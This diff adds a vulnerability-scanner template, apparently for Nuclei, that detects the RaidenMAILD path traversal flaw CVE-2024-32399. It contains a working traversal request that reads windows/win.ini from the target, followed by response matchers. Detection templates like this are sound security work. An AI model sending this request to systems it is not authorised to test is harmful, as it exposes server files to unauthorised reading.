@@ -1,0 +1,30 @@
+id: raidenmaild-path-traversal
+info:
+  name: RaidenMAILD Path Traversal Vulnerability (CVE-2024-32399)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2024-32399,path-traversal
+http:
+  - raw:
+      - |
+        GET /webeditor/../../../windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "; for 16-bit app support"
+          - "[files]"
+        part: body
+      - type: word
+        words:
+          - "filename=\"../../../windows/win.ini\""
+        part: header
+      - type: regex
+        regex:
+          - "^(?!.*<).*$"
+        part: body
+        negative: true
